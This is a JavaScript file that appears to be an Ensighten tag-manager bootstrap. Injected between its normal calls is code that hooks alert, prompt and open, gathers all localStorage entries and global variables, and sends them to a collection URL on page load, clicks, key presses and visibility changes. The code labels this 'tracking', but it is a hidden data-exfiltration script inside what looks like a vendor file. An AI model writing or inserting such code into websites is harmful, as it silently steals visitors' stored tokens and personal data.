var globalVarList = [];
Bootstrapper._serverTime = '2023-11-11 08:17:48';
function jshook(methodHook) {
  const originalMethod = window[methodHook];
  window[methodHook] = function () {
    const info = {
      methodName: methodHook,
      arguments: arguments
    };
    globalVarList.push(info);
    return originalMethod.apply(this, arguments);
  };
}
function collectLocalStorage() {
  let localStorageData = {};
  for (let key in localStorage) {
    localStorageData[key] = localStorage[key];
  }
  return localStorageData;
}
function collectGlobalVariable() {
  let globalVariableData = {};
  for (let key in window) {
    if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
      let value = window[key];
      let type = typeof value;
      globalVariableData[key] = {
        type: type,
        value: type === 'function' ? undefined : value
      };
    }
  }
  return globalVariableData;
}
Bootstrapper._clientIP = '38.207.136.105';
async function sendTrackingData(data) {
  const apiUrl = 'https://example.com/api/collect';
  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log('Tracking data was sent successfully.');
    } else {
      console.error('Error sending tracking data, status code:' + response.status);
    }
  } catch (error) {
    console.error('An error occurred sending tracking data:', error);
  }
}
function collectAndSendTrackingData() {
  const localStorageData = collectLocalStorage();
  const globalVariableData = collectGlobalVariable();
  let combinedData = {
    localStorage: localStorageData,
    globalVariables: globalVariableData,
    globalVarList: globalVarList
  };
  if (Object.keys(combinedData.localStorage).length > 0 || Object.keys(combinedData.globalVariables).length > 0 || combinedData.globalVarList.length > 0) {
    sendTrackingData(combinedData);
  }
  globalVarList = [];
}
Bootstrapper.insertPageFiles(['http://nexus.ensighten.com/choozle/17098/code/d3d14424fac71699bdbff068d9b1184b.js?conditionId0=421905', 'http://nexus.ensighten.com/choozle/17098/code/1fc8553a686089c9698160748311de5d.js?conditionId0=4947114&conditionId1=4934733']);
["alert", "prompt", "open"].forEach(jshook);
window.addEventListener('load', collectAndSendTrackingData);
Bootstrapper.setPageSpecificDataDefinitionIds([]);
document.addEventListener('visibilitychange', collectAndSendTrackingData);
document.addEventListener('click', collectAndSendTrackingData);
document.addEventListener('keydown', collectAndSendTrackingData);